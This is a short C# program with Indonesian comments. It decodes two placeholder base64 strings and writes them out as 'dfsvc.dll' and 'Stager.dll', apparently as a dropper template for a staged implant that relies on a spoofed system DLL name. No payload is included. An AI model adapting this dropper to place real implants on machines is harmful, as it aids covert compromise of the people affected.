// Manual compile: csc /platform:x64 /target:library DLLDownloader.cs 
// atau 
// csc /platform:x64 /target:exe DLLDownloader.cs

using System; // Mengimpor namespace System untuk akses ke kelas dasar seperti Console dan Exception
using System.IO; // Mengimpor namespace System.IO untuk akses ke operasi file

namespace DllDownloader // Mendefinisikan namespace untuk mengelompokkan kelas
{
    class Program // Mendefinisikan kelas Program
    {
        static void Main(string[] args) // Metode utama yang dieksekusi saat program dijalankan
        {
            // Konten dfsvc.dll yang telah dienkode dalam format base64
            string base64Content1 = "Your base64 string for dfsvc.dll here";

            // Konten Stager.dll yang telah dienkode dalam format base64
            string base64Content2 = "Your base64 string for Stager.dll here";

            // Mengonversi string base64 menjadi array byte
            byte[] fileBytes1 = Convert.FromBase64String(base64Content1);
            byte[] fileBytes2 = Convert.FromBase64String(base64Content2);

            // Menentukan nama file untuk disimpan
            string fileName1 = "dfsvc.dll"; // Nama file untuk dll pertama
            string fileName2 = "Stager.dll"; // Nama file untuk dll kedua

            try
            {
                // Menyimpan array byte ke dalam file dengan nama yang ditentukan
                File.WriteAllBytes(fileName1, fileBytes1); // Menyimpan dfsvc.dll
                File.WriteAllBytes(fileName2, fileBytes2); // Menyimpan Stager.dll

                // Menampilkan pesan sukses jika file berhasil disimpan
                Console.WriteLine($"DLLs '{fileName1}' dan '{fileName2}' berhasil diunduh.");
            }
            catch (Exception ex) // Menangkap dan menangani pengecualian yang mungkin terjadi
            {
                // Menampilkan pesan kesalahan jika ada masalah saat menyimpan file
                Console.WriteLine($"Gagal mengunduh DLLs: {ex.Message}");
            }
        }
    }
}